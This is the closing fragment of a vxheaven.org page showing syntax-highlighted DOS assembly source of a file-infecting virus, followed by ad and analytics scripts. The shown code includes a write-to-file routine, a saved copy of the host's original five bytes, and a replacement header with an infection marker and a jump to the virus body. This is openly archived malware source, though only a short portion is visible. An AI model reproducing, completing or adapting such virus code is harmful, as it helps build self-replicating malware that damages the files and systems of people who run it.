        <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span>
        <span style="color: #0000ff; font-weight: bold;">db</span>      03d
_wf<span style="color: #339933;">:</span>    <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40</span>                   <span style="color: black; font-style: italic;">;Write to File..</span>
        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21</span>
        <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
orig_5<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">db</span> 0cd<span style="color: #339933;">,</span><span style="color: #ff0000;">20</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>                 <span style="color: black; font-style: italic;">;original 5 bytes..</span>
&nbsp;
new_5<span style="color: #339933;">:</span>  <span style="color: #00007f; font-weight: bold;">test</span>    <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span>0ff                  <span style="color: black; font-style: italic;">;Infection Marker (0a8,0ff)</span>
        <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0e9</span>                     <span style="color: black; font-style: italic;">;JMP Near</span>
jmp_buf <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">0</span>                       <span style="color: black; font-style: italic;">;jump offset..</span>
&nbsp;</pre></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/src_view.php?lang=de&amp;file=242.zip">de</a><a href="/src_view.php?lang=en&amp;file=242.zip">en</a><a href="/src_view.php?lang=es&amp;file=242.zip">es</a><a href="/src_view.php?lang=it&amp;file=242.zip">it</a><a href="/src_view.php?lang=fr&amp;file=242.zip">fr</a><a href="/src_view.php?lang=pl&amp;file=242.zip">pl</a><a href="/src_view.php?lang=ru&amp;file=242.zip">ru</a><a href="/src_view.php?lang=ua&amp;file=242.zip">ua</a></div>
</body>
</html>
